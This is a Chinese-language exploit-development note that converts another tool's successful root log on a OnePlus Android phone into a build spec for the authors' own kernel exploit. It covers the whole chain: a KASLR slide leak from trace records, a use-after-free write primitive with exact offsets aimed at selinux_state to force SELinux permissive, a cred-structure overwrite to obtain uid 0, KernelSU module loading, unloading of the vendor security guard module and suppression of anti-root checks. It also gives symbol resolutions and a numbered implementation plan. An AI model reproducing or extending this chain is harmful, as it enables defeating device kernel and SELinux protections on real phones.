# Shark 98260 成功日志 → 可执行规格

来源：用户在 OnePlus 16 / 17.0.1.201（6.18.21-…-g7fcbffcad3e1-ab16353812-4k）上实跑成功，
总耗时 **23:52:22 → 23:52:25 ≈ 3 秒**（含 manager setup）。

## 全流程（按日志顺序）

| 阶段 | 关键输出 | 含义 |
| --- | --- | --- |
| preflight | `PROBE_KERNEL=…`、`PROBE_TRACE=yes`、`PROBE_OK` | 内核串 + tracefs 可用性检查 |
| slide | `LEAK_CPU cpu=0 raw=188416 rec=2048` → `SLIDE_DERIVED=0x293f000000 site=0xffffffe9bf3da37c` | **一次**就从 trace 记录里同时得到 slide 和 site |
| tile UAF | `RECLAIM_MODE=tile off=0x860 target=ffffffe9c1999629` → `RECLAIM_FREED=1 cpu=5` → `RECLAIM_WRITES=4096 HIT=1` → `UAF mode=tile ms=558 rc=0` | 用 0x860 偏移的 tile 页做写原语，558ms 命中 |
| selinux | `SELINUX=permissive` | 写 selinux_state 得到 permissive |
| task | `LEAK_TASK ptr=ffffff8920173d80 attempt=1 child=…`、`STAGE=task T=558ms` | 泄漏目标 task |
| cred | `RECLAIM_MODE=cred node=ffffff89cecd89e0 off=0x9e0 blob=0` → `CRED_INSTALLED` → `CRED_REPORT=uid=538396296 euid=0 …` → `CRED_NOT_ROOT` | 第一次 cred 写不完整（uid 错） |
| 重试 | 又一次 tile：`off=0xfe0 target=ffffff89cecd89e8` → `UAF mode=tile ms=498` | 补 uid |
| root | `CRED_REPORT=ROOT uid=0 caps=0 test=1 tcap=1ffffffffff`、`STAGE=rootd T=1640ms` | 拿到 euid=0 的子进程 |
| late-load | `libksud.so late-load --kmi android17-6.18 --allow-shell --package-name me.yuki.fina` → `LATE_LOAD_RC=0` | 用**管理器自带的 libksud** 加载模块 |
| 模块 | `MODULE_LOADED`、`grep kernelsu /proc/modules → Live` | 模块已加载 |
| 收尾 | `UNLOAD_GUARD: rmmod oplus_secure_guard_new`（RC=0，GONE）、`KSUD_INSTALL_RC=0`、`ANTIROOT_STOP_RC=0`、`SUSFS_SKIP`、`VFS_SKIP` | 卸内核防护、ksud install、停安全弹窗 |
| 验收 | `su: uid=0(root) … context=u:r:ksu:s0`、`Enforcing`、`SU_ID_RC=0` | root 可用 |

## 与我们实现的差异（关键）

| 项 | Shark | 我们（ic98260 / onuce） |
| --- | --- | --- |
| slide 来源 | 一次 trace 采样同时给出 slide + site | 我们用 trace 假设检验也能一次给出（已验证 SLIDE_OK） |
| UAF 写原语 | tile 模式，页内偏移 **0x860**，**4096** 次写，一次命中（558ms） | 我们用的是 elist/0x30/0x68 那套，且从未命中 |
| cred 写 | **off 0x9e0**，先写 cred 再补 uid（0xfe0） | 我们没走到 |
| 提权判据 | `CRED_REPORT` 里 uid/euid + caps 位 | 无 |
| 模块加载 | 管理器 libksud `late-load --kmi android17-6.18` | 我们也是这条路，但没到 |
| 收尾 | rmmod oplus_secure_guard_new + ksud install + antiroot stop | 未实现 |

## 下一轮实现顺序

1. 我们的 leak 已经能给出 slide（`SLIDE_OK`）；补齐 **site** 的取法（同一条 trace 记录里的代码地址）；
2. 实现 tile 写原语：目标 = slide + 符号（先做 selinux_state → permissive），页内偏移 0x860、写 4096；
3. 实现 cred 写：off 0x9e0 写 cred 结构（uid/gid/euid/egid/fsuid/fsgid=0、cap_* 全 1），必要时补 uid；
4. 用管理器 libksud 做 `late-load --kmi android17-6.18`，轮询 `/proc/modules`；
5. 收尾：rmmod oplus_secure_guard_new、ksud install、停安全弹窗、截屏栈检查。

## 日志里的地址反解（用同一内核的符号表算出来，已确认）

| 日志字段 | 原值 | 减 slide 后的静态地址 | 命中符号 |
| --- | --- | --- | --- |
| `site` | 0xffffffe9bf3da37c | 0xffffffc0803da37c | **do_timer_create + 0xb8** |
| `tile target` | 0xffffffe9c1999629 | 0xffffffc082999629 | **selinux_state − 7**（紧邻 avc_latest_notif_update.notif_lock） |
| `cred node` | 0xffffff89cecd89e0 | 堆地址（非 slide 相关） | — |
| `task` | 0xffffff8920173d80 | 堆地址 | — |

含义：
1. 它的 slide 来源和我们一样——**从 trace 里的代码调用点反推**（site 落在 do_timer_create 内，正好是 posix timer 创建路径）；
2. tile 写原语的目标就是 **selinux_state − 7**，与 64560 链里的经典写法一致；
3. cred 与 task 是堆地址，靠同一次 UAF 泄漏得到。

这两个结论把「要不要盲猜」变成了「已知目标」：我们可以直接按 selinux_state−7 做 permissive 里程碑。

